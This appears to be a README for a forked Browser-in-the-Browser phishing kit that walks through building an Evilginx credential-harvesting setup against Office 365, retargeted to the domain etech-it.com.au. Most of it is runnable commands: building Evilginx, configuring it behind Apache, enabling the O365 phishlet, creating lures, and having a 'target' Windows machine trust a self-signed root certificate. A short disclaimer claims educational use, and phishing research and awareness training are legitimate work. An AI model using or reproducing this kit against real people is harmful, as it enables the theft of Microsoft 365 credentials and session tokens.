# IMPORTANT - THIS REPO is entirely based on [wael-mas/Frameless-BITB](https://github.com/waelmas/frameless-bitb.git) but has been edit to show a etech-it.com.au instead of fake.com as the domain name, and streamlined instructions for setup

# Disclaimer

This tool is for educational and research purposes only. It demonstrates a non-iframe based Browser In The Browser (BITB) method. The author is not responsible for any misuse. Use this tool only legally and ethically, in controlled environments for cybersecurity defense testing. By using this tool, you agree to do so responsibly and at your own risk.

# Instructions

## Local VM:
Create a local Linux VM and ensure it is on bridged adapter network mode

Update and Upgrade system packages:

```
sudo apt update && sudo apt upgrade -y
```

## Install required packages:

### NVM/Nodejs
```
# installs nvm (Node Version Manager)
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash

# download and install Node.js (you may need to restart the terminal)
nvm install 20

# verifies the right Node.js version is in the environment
node -v # should print `v20.18.0`

# verifies the right npm version is in the environment
npm -v # should print `10.8.2`
```

### Install Go: [Official Docs](https://go.dev/doc/install)

```
wget https://go.dev/dl/go1.23.2.linux-amd64.tar.gz
```

```
sudo tar -C /usr/local -xzf go1.23.2.linux-amd64.tar.gz
```

```
nano ~/.profile
```

ADD: `export PATH=$PATH:/usr/local/go/bin`

```
source ~/.profile
```

Check:
```
go version
```

### Install make:

```
sudo apt install git
```

### Install make:

```
sudo apt install make
```

### Install Apache2:

```
sudo apt install apache2 -y
```

Enable Apache2 mods that will be used:
(We are also disabling access_compat module as it sometimes causes issues)

```
sudo a2enmod proxy
sudo a2enmod proxy_http
sudo a2enmod proxy_balancer
sudo a2enmod lbmethod_byrequests
sudo a2enmod env
sudo a2enmod include
sudo a2enmod setenvif
sudo a2enmod ssl
sudo a2ensite default-ssl
sudo a2enmod cache
sudo a2enmod substitute
sudo a2enmod headers
sudo a2enmod rewrite
sudo a2dismod access_compat
```

Start and enable Apache:

```
sudo systemctl start apache2
```

```
sudo systemctl enable apache2
```
## Evilginx Setup:


#### Setting Up Evilginx

[Official Docs](https://help.evilginx.com/docs/intro)

Download, install and build Evilginx:

```
git clone https://github.com/kgretzky/evilginx2.git

cd /home/kali/evilginx2
```

```
make
```

Create a new directory for our evilginx build along with phishlets and redirectors:

```
mkdir /home/kali/hack
```

Copy build, phishlets, and redirectors:

```
cp /home/kali/evilginx2/build/evilginx /home/kali/hack/evilginx

cp -r /home/kali/evilginx2/redirectors /home/kali/hack/redirectors

cp -r /home/kali/evilginx2/phishlets /home/kali/hack/phishlets
```

### It is important to run and begin configuration of evilginx before attempting to change the listening port in the following sets

## Running Evilginx:


At this point, everything should be ready so we can go ahead and start Evilginx, set up the phishlet, create our lure, and test it.

```
cd ~/evilginx/
```

```
./evilginx -developer
```

Evilginx Config:

```
config domain etech-it.com.au
```

```
config ipv4 127.0.0.1
```


**IMPORTANT:** Set Evilginx Blacklist mode to NoAdd to avoid blacklisting Apache since all requests will be coming from Apache and not the actual visitor IP.

```
blacklist noadd
```


## Modify Evilginx Configurations:


Since we will be using Apache2 in front of Evilginx, we need to make Evilginx listen to a different port than 443.

```
nano ~/.evilginx/config.json
```

CHANGE `https_port` from `443` to `8443`

## Clone BITB Repo:

Clone the BITB Repo, based on [waelmas/frameless-bitb](https://github.com/waelmas/frameless-bitb.git):

```
git clone https://github.com/s4011779/etech-bitb
```

```
cd etech-bitb
```

## Apache Custom Pages:


Make directories for the pages we will be serving:

- home: (Optional) Homepage (at base domain)
- primary: Landing page (background)
- secondary: BITB Window (foreground)


```
sudo mkdir /var/www/home
sudo mkdir /var/www/primary
sudo mkdir /var/www/secondary
```


Copy the directories for each page:

```

sudo cp -r ./pages/home/ /var/www/

sudo cp -r ./pages/primary/ /var/www/

sudo cp -r ./pages/secondary/ /var/www/

```

Optional: Remove the default Apache page (not used):

```
sudo rm -r /var/www/html/
```


From inside the hack dir - copy the O365 phishlet to phishlets directory:

```
sudo cp /home/kali/hack/etech-bitb/O365.yaml /home/kali/hack/phishlets/O365.yaml
```

## Self-signed SSL certificates:

Since we are running everything locally, we need to generate self-signed SSL certificates that will be used by Apache. Evilginx will not need the certs as we will be running it in developer mode.


We will use the domain `etech-it.com.au` which will point to our local VM. If you want to use a different domain, make sure to change the domain in all files (Apache conf files, JS files, etc.)


Create dir and parents if they do not exist:

```
sudo mkdir -p /etc/ssl/localcerts/etech-it.com.au/
```


Generate the SSL certs using the OpenSSL config file:

```
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
-keyout /etc/ssl/localcerts/etech-it.com.au/privkey.pem -out /etc/ssl/localcerts/etech-it.com.au/fullchain.pem \
-config openssl-local.cnf
```

Modify private key permissions:

```
sudo chmod 600 /etc/ssl/localcerts/etech-it.com.au/privkey.pem
```

## Apache Custom Configs:

Copy custom substitution files (the core of our approach):

```
sudo cp -r ./custom-subs /etc/apache2/custom-subs
```

Simply to make it easier, I included both versions as separate files for this next step.


**Windows/Chrome** BITB:

```
sudo cp ./apache-configs/win-chrome-bitb.conf /etc/apache2/sites-enabled/000-default.conf
```

Test Apache configs to ensure there are no errors:

```
sudo apache2ctl configtest
```

Restart Apache to apply changes:

```
sudo systemctl restart apache2
```

#### Important Note:
This demo is made with the provided Office 365 Enterprise phishlet. To get the host entries you need to add for a different phishlet, use `phishlet get-hosts [PHISHLET_NAME]` but remember to replace the `127.0.0.1` with the actual local IP of your VM.

Head back into evilginx2:

Setup Phishlet and Lure:

```
phishlets hostname O365 etech-it.com.au
```

```
phishlets enable O365
```

```
lures create O365
```

```
lures get-url 0
```


Copy the lure URL and store

## Modifying Hosts:


Get the IP of the VM using `ifconfig` and note it somewhere for the next step.

We now need to add new entries to our hosts file, to point the domain used in this demo `etech-it.com.au` and all used subdomains to our VM on which Apache and Evilginx are running.


## On attacker Linux machine:

```
ifconfig
```
copy ip 

```
sudo nano /etc/hosts
```

add copied IP to hosts file:
```
# Local Apache and Evilginx Setup
[IP] login.etech-it.com.au
[IP] account.etech-it.com.au
[IP] sso.etech-it.com.au
[IP] www.etech-it.com.au
[IP] portal.etech-it.com.au
[IP] etech-it.com.au
# End of section
```

Copy the lure URL and visit it from a private browser, it should display your BITB phishing page.

## Now change to your Targets Windows machine:**

Open Notepad as Administrator (Search > Notepad > Right-Click > Run as Administrator)

Click on the File option (top-left) and in the File Explorer address bar, copy and paste the following:

`C:\Windows\System32\drivers\etc\`

Change the file types (bottom-right) to "All files".

Double-click the file named `hosts`

Now modify the following records (replace `[IP]` with the IP of your VM) then paste the records at the end of the hosts file:

```
# Local Apache and Evilginx Setup
[IP] login.etech-it.com.au
[IP] account.etech-it.com.au
[IP] sso.etech-it.com.au
[IP] www.etech-it.com.au
[IP] portal.etech-it.com.au
[IP] etech-it.com.au
# End of section
```

Save and exit.

Now restart your browser before moving to the next step.

## Trusting the Self-Signed SSL Certs:


Since we are using self-signed SSL certificates, our browser will warn us every time we try to visit `etech-it.com.au` so we need to make our host machine trust the certificate authority that signed the SSL certs.

For this step, it's easier to follow the video instructions, but here is the gist anyway.

## ON 'Target's machine (victim) Windows

Open [https://etech-it.com.au/](https://etech-it.com.au/) in your Chrome browser.

Ignore the Unsafe Site warning and proceed to the page.

Click the SSL icon > Details > Export Certificate
**IMPORTANT:** When saving, the name MUST end with .crt for Windows to open it correctly.

Double-click it > install for current user. Do NOT select automatic, instead place the certificate in specific store: select "Trusted Route Certification Authorities".


**Now RESTART your Browser**

You should be able to visit your evilnginx2 lure now and see the phishing page without any SSL warnings.

# Useful Resources


Original iframe-based BITB by @mrd0x:
[https://github.com/mrd0x/BITB](https://github.com/mrd0x/BITB)

Evilginx Mastery Course by the creator of Evilginx @kgretzky:
[https://academy.breakdev.org/evilginx-mastery](https://academy.breakdev.org/evilginx-mastery)

My talk at BSides 2023:
[https://www.youtube.com/watch?v=p1opa2wnRvg](https://www.youtube.com/watch?v=p1opa2wnRvg)

How to protect Evilginx using Cloudflare and HTML Obfuscation:
[https://www.jackphilipbutton.com/post/how-to-protect-evilginx-using-cloudflare-and-html-obfuscation](https://www.jackphilipbutton.com/post/how-to-protect-evilginx-using-cloudflare-and-html-obfuscation)

Evilginx resources for Microsoft 365 by @BakkerJan:
[https://janbakker.tech/evilginx-resources-for-microsoft-365/](https://janbakker.tech/evilginx-resources-for-microsoft-365/)
